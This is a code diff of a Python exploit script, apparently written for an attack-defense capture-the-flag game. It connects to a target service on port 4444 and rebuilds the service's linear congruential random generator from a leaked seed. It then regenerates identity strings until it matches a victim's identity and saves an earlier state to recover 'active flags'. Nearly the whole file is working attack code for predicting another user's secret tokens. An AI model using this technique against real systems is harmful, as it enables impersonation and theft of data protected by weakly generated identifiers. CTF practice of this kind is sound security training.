@@ -1,4 +1,3 @@
-import ctypes
 import re
 import socket
 import sys
@@ -6,23 +5,32 @@ import time
 
 IDENTITY_LENGTH = 64
 
-# Load the C standard library
-libc = ctypes.CDLL(None)
+# Linear Congruential Generator parameters
+A = 1103515245
+C = 12345
+M = 2147483648  # 2^31
 
-# Set argument and return types for rand_r
-libc.rand_r.argtypes = [ctypes.POINTER(ctypes.c_uint)]
-libc.rand_r.restype = ctypes.c_int
+# Seed value, initialized to 1
+seed = 1
 
-def generate_identity_string(state):
-    state_ptr = ctypes.c_uint(state)
-    identity_string = ''.join(chr(ord('a') + (libc.rand_r(ctypes.byref(state_ptr)) % 26)) for _ in range(IDENTITY_LENGTH))
-    return identity_string, state_ptr.value
+def slcgrand(s):
+    global seed
+    seed = s
+
+def lcgrand():
+    global seed
+    seed = (A * seed + C) % M
+    return seed
+
+def generate_identity_string():
+    identity_string = ''.join(chr(ord('a') + (lcgrand() % 26)) for _ in range(IDENTITY_LENGTH))
+    return identity_string
 
 def get_unix_time_from_string(date_string):
     # Format of date_string: "2024-07-15 11:35:24"
     return int(time.mktime(time.strptime(date_string, "%Y-%m-%d %H:%M:%S")))
 
-TARGET = sys.argv[1] # The target's ip address is passed as an command line argument
+TARGET = sys.argv[1]  # The target's ip address is passed as a command line argument
 PORT = 4444
 
 def get_seed_and_current_identity(host, port):
@@ -53,7 +61,7 @@ def get_seed_and_current_identity(host, port):
         recv_until_prompt(b'$ ')
         current_identity = identity_response.split("\n")[0].split(":")[1].strip()
         return seed, current_identity
-    
+
 # 1. Try to read state.txt if it exists
 try:
     with open("state.txt", "r") as f:
@@ -66,23 +74,22 @@ except FileNotFoundError:
         f.writelines([str(state), "\n", match])
 
 # 2. Generate identity strings until we find the correct one, print every Nth identity
-# start_seed = 1721065234
 N = 100000
-BACK = 10000
 i = 1
-states = []
+slcgrand(state)
+seeds = []
 while True:
-    identity, state = generate_identity_string(state)
+    identity = generate_identity_string()
     if identity == match:
         print(f"Found matching identity: {identity}")
         break
     if i % N == 0:
-        print(f"State at {i}: {state}")
-        states.append(state)
+        print(f"State at {i}: {seed}")
+        seeds.append(seed)
     i += 1
 
 # 3. Print the final state
-print(f"Match found! State: {state}")
-print(f"Storing state {N} steps past, as they might include active flags")
+print(f"Match found! State: {seed}")
+print(f"Storing seed {N} back in time, so that active flags can be found")
 with open("state.txt", "w") as f:
-    f.writelines([str(state), "\n", match])
+    f.writelines([str(seeds[-2]), "\n", match])
